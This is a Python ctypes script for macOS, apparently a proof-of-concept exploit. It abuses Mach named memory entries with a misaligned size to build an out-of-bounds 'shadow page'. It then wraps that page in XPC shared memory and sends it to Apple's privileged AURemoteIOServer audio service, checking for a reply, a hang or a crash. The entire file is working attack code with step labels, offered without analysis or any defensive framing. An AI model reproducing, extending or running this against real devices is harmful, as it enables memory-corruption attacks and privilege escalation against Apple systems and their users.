import ctypes as C
import threading

L = C.CDLL('/usr/lib/libSystem.B.dylib')
X = C.CDLL('/usr/lib/system/libxpc.dylib')
L.mach_task_self.restype = C.c_uint32
t = L.mach_task_self()

# Step 1: Shadow page via Surface 4 OOB
M = L.mach_make_memory_entry_64
M.argtypes = [C.c_uint32,C.POINTER(C.c_uint64),C.c_uint64,C.c_int,C.POINTER(C.c_uint32),C.c_uint32]
V = L.mach_vm_map
V.argtypes = [C.c_uint32,C.POINTER(C.c_uint64),C.c_uint64,C.c_uint64,C.c_int,C.c_uint32,C.c_uint64,C.c_int,C.c_int,C.c_int,C.c_int]
L.mach_vm_allocate.argtypes = [C.c_uint32,C.POINTER(C.c_uint64),C.c_uint64,C.c_int]

a = C.c_uint64(0)
kr = L.mach_vm_allocate(t, C.byref(a), 0x4000, 1)
print(f"alloc kr={kr} va={hex(a.value)}")
if kr != 0 or a.value == 0:
    print("BAIL: alloc failed"); raise SystemExit(1)

p = C.c_uint32(0); ps = C.c_uint64(0x4000)
kr = M(t, C.byref(ps), a.value, 3, C.byref(p), 0)
print(f"parent ne kr={kr} p={p.value}")
if kr != 0 or p.value == 0:
    print("BAIL: parent named entry failed"); raise SystemExit(1)

c = C.c_uint32(0); cs = C.c_uint64(0x1001)
kr = M(t, C.byref(cs), 0x1000, 3, C.byref(c), p.value)
print(f"child ne kr={kr} c={c.value} size_out={hex(cs.value)}")
if kr != 0 or c.value == 0:
    print("BAIL: child named entry failed"); raise SystemExit(1)

m = C.c_uint64(0)
kr = V(t, C.byref(m), 0x4000, 0, 1, c.value, 0, 0, 3, 3, 0)
print(f"map child kr={kr} va={hex(m.value)}")
if kr != 0 or m.value == 0:
    print("BAIL: map failed"); raise SystemExit(1)

q = (C.c_uint8*0x4000).from_address(m.value)
q[0x3000] = 0xAB

ne = C.c_uint32(0); ns = C.c_uint64(0x1000)
kr = M(t, C.byref(ns), m.value + 0x3000, 3, C.byref(ne), 0)
print(f"shadow ne kr={kr} ne={ne.value}")
if kr != 0 or ne.value == 0:
    print("BAIL: shadow named entry failed"); raise SystemExit(1)

m4 = C.c_uint64(0)
kr = V(t, C.byref(m4), 0x4000, 0, 1, ne.value, 0, 0, 3, 3, 0)
shadow_va = m4.value
print(f"shadow VA: {hex(shadow_va)} ne={ne.value} kr={kr}")
if kr != 0 or shadow_va == 0:
    print("BAIL: shadow map failed"); raise SystemExit(1)

# Step 2: Wrap shadow page in xpc_shmem
X.xpc_shmem_create.restype = C.c_void_p
X.xpc_shmem_create.argtypes = [C.c_void_p, C.c_uint64]
shmem = X.xpc_shmem_create(shadow_va, 0x1000)
print(f"xpc_shmem: {hex(shmem or 0)}")
if not shmem:
    print("BAIL: xpc_shmem_create returned NULL"); raise SystemExit(1)

# Step 3: Connect to AURemoteIOServer
X.xpc_connection_create_mach_service.restype = C.c_void_p
X.xpc_connection_create_mach_service.argtypes = [C.c_char_p, C.c_void_p, C.c_uint64]
X.xpc_connection_resume.restype = None
X.xpc_connection_resume.argtypes = [C.c_void_p]
conn = X.xpc_connection_create_mach_service(b"com.apple.audio.AURemoteIOServer", None, 0)
X.xpc_connection_resume(conn)
print(f"conn: {hex(conn or 0)}")
if not conn:
    print("BAIL: connection is NULL"); raise SystemExit(1)

# Step 4: Send minimal dict with our shmem — thread-wrapped with 3s timeout
X.xpc_dictionary_create.restype = C.c_void_p
X.xpc_dictionary_create.argtypes = [C.c_void_p, C.c_void_p, C.c_uint64]
X.xpc_dictionary_set_value.restype = None
X.xpc_dictionary_set_value.argtypes = [C.c_void_p, C.c_char_p, C.c_void_p]
X.xpc_connection_send_message_with_reply_sync.restype = C.c_void_p
X.xpc_connection_send_message_with_reply_sync.argtypes = [C.c_void_p, C.c_void_p]
X.xpc_copy_description.restype = C.c_char_p
X.xpc_copy_description.argtypes = [C.c_void_p]

msg = X.xpc_dictionary_create(None, None, 0)
X.xpc_dictionary_set_value(msg, b"sharedMemory", shmem)

result = [None]
def send():
    result[0] = X.xpc_connection_send_message_with_reply_sync(conn, msg)

th = threading.Thread(target=send, daemon=True)
th.start()
th.join(timeout=3.0)

if th.is_alive():
    print("TIMEOUT: no reply from AURemoteIOServer in 3s")
else:
    reply = result[0]
    print(f"reply: {hex(reply or 0)}")
    if reply:
        desc = X.xpc_copy_description(reply)
        print(f"reply desc: {desc[:800] if desc else 'none'}")
    else:
        print("reply is NULL (connection error or process-terminate)")
